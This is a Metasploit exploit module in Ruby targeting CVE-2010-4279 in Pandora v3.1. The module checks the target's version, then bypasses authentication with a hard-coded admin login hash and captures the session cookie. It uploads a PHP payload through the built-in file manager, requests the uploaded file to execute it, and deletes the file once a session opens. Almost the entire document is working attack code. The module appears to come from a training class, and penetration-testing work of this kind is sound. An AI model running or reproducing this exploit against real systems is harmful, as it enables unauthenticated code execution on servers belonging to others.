##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Pandora v3.1 Auth Bypass and Arbitrary File Upload Vulnerability",
			'Description'    => %q{
				This module exploits an authentication bypass vulnerability in Pandora v3.1 as 
				disclosed by Juan Galiana Lara.  It also integrates with the built-in pandora 
				upload which allows a user to upload arbitrary files to the '/images/' directory.

				This module was created as an exercise in the Metasploit Mastery Class at Blackhat 
				that was facilitated by egypt and mubix.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Raymond Nunez <rcnunez[at]upd.edu.ph>', # metasploit module
					'_flood <freshbones[at]gmail.com>', # metasploit module
					'mubix <mubix[at]room362.com>', # auth bypass and file upload
					'egypt <egypt[at]metasploit.com>', # auth bypass file upload
				],
			'References'     =>
				[
					['CVE', '2010-4279'],
					['OSVDB',   '69549'],
					['BID',   '45112']
				],
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 30 2010",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The path to the web application', '/pandora_console/']),
			], self.class)
	end

	def check

		base  = target_uri.path
		peer  = "#{rhost}:#{rport}"

		# retrieve software version from login page
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => normalize_uri(base, 'index.php')
			})
			if res and res.code == 200
				if res.body =~ /v3.1 Build PC100609/
					return Exploit::CheckCode::Vulnerable
				elsif res.body =~ /Pandora/
					return Exploit::CheckCode::Detected
				end
			end
			return Exploit::CheckCode::Safe
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{peer} - Connection failed")
		end
		return Exploit::CheckCode::Unknown

	end

	# upload a payload using the pandora built-in file upload
	def upload(base, file, cookiemonster)
		data = Rex::MIME::Message.new
		data.add_part(file, 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"#{@fname}.php\"")
		data.add_part("Go", nil, nil, 'form-data; name="go"')
		data.add_part("images", nil, nil, 'form-data; name="directory"')
		data.add_part("1", nil, nil, 'form-data; name="upload_file"')
		data_post = data.to_s
		data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

		res = send_request_cgi({
			'method'  => 'POST',
			'uri'     => normalize_uri(base, 'index.php?sec=gsetup&sec2=godmode/setup/file_manager'),
			'cookie'  => cookiemonster,
			'ctype'   => "multipart/form-data; boundary=#{data.bound}",
			'data'    => data_post
		})
		return res
	end

	def on_new_session(client)
		if client.type == "meterpreter"
			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
			client.fs.file.rm("#{@fname}.php")
		else
			client.shell_command_token("rm #{@fname}.php")
		end
	end

	def exploit

		base   = target_uri.path
		@peer  = "#{rhost}:#{rport}"
		@fname = rand_text_numeric(7)

		# bypass authentication and get session cookie
		res = send_request_cgi({
                        'method'  => 'GET',
                        'uri'     => normalize_uri(base, 'index.php?loginhash_data=21232f297a57a5a743894a0e4a801fc3&loginhash_user=admin&loginhash=1')
                })

                # fix if logic
                if res and res.code == 200
                    if res.body =~ /Logout/
					cookiemonster = res.headers['Set-Cookie']
					cookiemonster = cookiemonster.split(" ")[0]
                                        print_status("Login Bypass Successful")
					print_status("cookie monster = " + cookiemonster)
				else
                                        print_error("Login Bypass Failed")
					fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Login bypass failed")
				end
		end

		# upload PHP payload to images/[fname].php
		print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length} bytes)")
		php    = %Q|<?php #{payload.encoded} ?>|
		begin
			res = upload(base, php, cookiemonster)
			if res and res.code == 200
				print_good("#{@peer} - File uploaded successfully")
			else
				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

		# retrieve and execute PHP payload
		print_status("#{@peer} - Executing payload (images/#{@fname}.php)")
		begin
			print_status ("base = " + base)
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => normalize_uri(base, 'images', "#{@fname}.php")
			})
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

	end
end
